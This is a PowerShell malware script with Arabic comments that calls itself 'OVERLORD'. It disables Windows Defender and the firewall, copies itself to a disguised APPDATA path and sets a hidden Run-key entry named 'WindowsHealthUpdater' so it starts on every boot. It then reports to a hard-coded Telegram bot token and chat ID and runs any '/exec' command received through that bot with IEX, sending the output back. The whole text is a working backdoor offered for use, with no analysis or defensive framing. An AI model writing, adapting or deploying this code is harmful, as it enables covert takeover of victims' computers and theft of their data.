# --- [STARK OMEGA: OVERLORD GIANTS-1] ---
# الوظيفة: كسر الحماية، زرع البقاء، وفتح الباك دور العكسي

$ErrorActionPreference = 'SilentlyContinue'

# 1. تعطيل الدفاعات فوراً (بصلاحيات الأدمن اللي الـ S3 وفرتها)
Write-Host "[!] Disabling Defenses..." -ForegroundColor Red
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
netsh advfirewall set allprofiles state off

# 2. آلية البقاء (Persistence) - زرع العميل في الـ Registry
# السكريبت هينسخ نفسه في مكان مخفي ويشتغل مع كل فتحة جهاز
$path = "$env:APPDATA\Microsoft\Windows\System32_Data.ps1"
if (!(Test-Path $path)) {
    $MyContent = (New-Object Net.WebClient).DownloadString($MyInvocation.MyCommand.Definition)
    $MyContent | Out-File -FilePath $path
    # زرع مفتاح التشغيل التلقائي
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsHealthUpdater' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
}

# 3. العميل الشامل (The Core Payload)
# فتح اتصال عكسي (Reverse Shell) مع بوت التليجرام الخاص بك للتحكم
$BOT_TOKEN = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$CHAT_ID = "7393359923"

function Send-ToStark($msg) {
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ chat_id = $CHAT_ID; text = "<b>[OVERLORD]</b>`n$msg"; parse_mode = "HTML" }
    Invoke-RestMethod -Uri $url -Method Post -Body $body
}

Send-ToStark "✅ العميل الأول تم زرعه بنجاح. النظام الآن تحت السيطرة الكاملة."

# 4. محرك الـ Zero-Click (الانتظار لاستقبال الأوامر)
# سكريبت صغير يراقب رسائل البوت لتنفيذ أوامر CMD فورية
while($true) {
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=-1"
        $cmd = $updates.result[0].message.text
        if ($cmd -match "^/exec ") {
            $execCmd = $cmd.Replace("/exec ", "")
            $output = IEX $execCmd 2>&1 | Out-String
            Send-ToStark "<b>Output:</b>`n<pre>$output</pre>"
        }
    } catch {}
    Start-Sleep -Seconds 5
}
